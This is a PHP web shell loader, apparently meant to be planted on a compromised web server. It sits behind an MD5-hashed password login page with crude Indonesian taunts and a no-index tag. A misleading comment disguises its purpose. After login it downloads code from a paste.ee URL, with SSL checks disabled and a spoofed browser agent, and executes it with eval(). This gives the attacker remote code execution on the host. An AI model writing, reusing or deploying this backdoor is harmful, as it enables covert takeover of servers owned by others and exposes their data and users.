<?php
session_start();

/**
 * Disable error reporting
 *
 * Set this to error_reporting( -1 ) for debugging.
 */
function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
        if (isset($_SESSION['Bapaklukkontol'])) {
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['Bapaklukkontol']);
        }

        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

function is_logged_in()
{
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}
if (isset($_POST['password'])) {
    $entered_password = $_POST['password'];
    $hashed_password = '7104aa8ae364cda06b8d5426020c5e50';
    if (md5($entered_password) === $hashed_password) {
        $_SESSION['logged_in'] = true;
        $_SESSION['Bapaklukkontol'] = 'pepek';
    } else {
        echo "Incorrect password. Please try again.";
    }
}
if (is_logged_in()) {
    $a = geturlsinfo('https://paste.ee/r/57zKP');
    eval('?>' . $a);
} else {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>XxX P3MB0K3P XxX - New Version</title>
        <meta name="description" content="Bapak Lu Jelek">
        <meta name="robots" content="NOINDEX, NOFOLLOW">
		<link rel="shortcut icon" href="https://i.ibb.co/b5Py3bL/pepek.jpg">
        <link rel="icon" type="image/png" href="https://i.ibb.co/b5Py3bL/pepek.jpg" sizes="16x16">
        <link rel="apple-touch-icon" href="https://i.ibb.co/b5Py3bL/pepek.jpg" sizes="180x180">
        <style>
            body {
                text-align: center;
                font-family: Arial, sans-serif;
                background-color: grey;
                color: rgb(229, 255, 0);
            }
            input, textarea {
            box-sizing: border-box;
            width: 500px;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }
        input:hover, textarea:hover {
            border-color: #3498db;
        }
        input:focus, textarea:focus {
            outline: none;
            border-color: #2980b9;
            box-shadow: 0 0 5px rgba(52, 152, 219, 0.5);
        }
    </style>
    </head>
    
    <body>
        <img style="width: 500px; height: 500px;" src="https://i.ibb.co/26qmd8m/asda-removebg-preview-1.png">
        <form method="POST" action="">
            <input type="password" id="password" name="password">
            <br>
            <input type="submit" value="Login">
        </form>


        <footer>
            <p><span class="brackets">[</span>Copyright 2024 Jujutsu Tema | Lutfifakee<span class="brackets">]</span></p>
            <p></p>
        </footer>
    </body>
    </html>
    <?php
}
?>